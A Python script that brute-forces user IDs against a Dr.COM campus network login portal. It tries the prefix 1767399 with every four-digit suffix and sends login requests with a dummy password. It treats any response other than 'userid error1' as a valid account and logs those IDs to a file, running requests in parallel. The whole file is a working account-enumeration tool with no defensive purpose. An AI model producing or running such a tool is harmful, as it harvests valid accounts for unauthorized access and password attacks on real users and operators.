import requests
import re
import itertools
import multiprocessing
import os


url = "http://10.100.10.100/drcom/login"     

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
}


def checkUserId(userId):
    params = {
        "callback": "dr1003",
        "DDDDD": f"{userId}@unicom",
        "upass": "1",
        "0MKKey": "000",
        "R1": "0",
        "R2": "",
        "R3": "0",
        "R6": "0",
        "para": "00",
        "v6ip": "",
        "terminal_type": "1",
        "lang": "zh-cn",
        "jsVersion": "4.2",
        "v": "6687",
        "lang": "zh"
    }
    try:
        res = requests.get(url, params=params, headers=headers).text
        data = re.findall(r'"msga":"(.*?)"', res)
        if data[0] != "userid error1":
            with open(fr"{os.getcwd()}\userId.txt", "a") as f:
                f.writelines(userId + "\n")
            print(userId, "√")
        else:
            print(userId, "x")
    except Exception as e:
        print(f"Error for user ID {userId}: {e}")
        return e


if __name__ == '__main__':
    results = []
    prefix_list = ["1767399"]  # Create numbers list        #“1767399” 可以随便改
    num_processes = 2  # Create 2 multiprocesses

    pool = multiprocessing.Pool(num_processes)
    for suffix in itertools.product(range(0, 10), repeat=4):
        suffix_str = ''.join(map(str, suffix))
        for prefix in prefix_list:
            user_id = f"{prefix}{suffix_str}"
            result = pool.apply_async(checkUserId, args=(user_id,))
            results.append(result)

    # Wait for all processes to finish
    pool.close()
    pool.join()

    # Print any exceptions that occurred during execution
    for result in results:
        if result.get() is not None:
            print(result.get())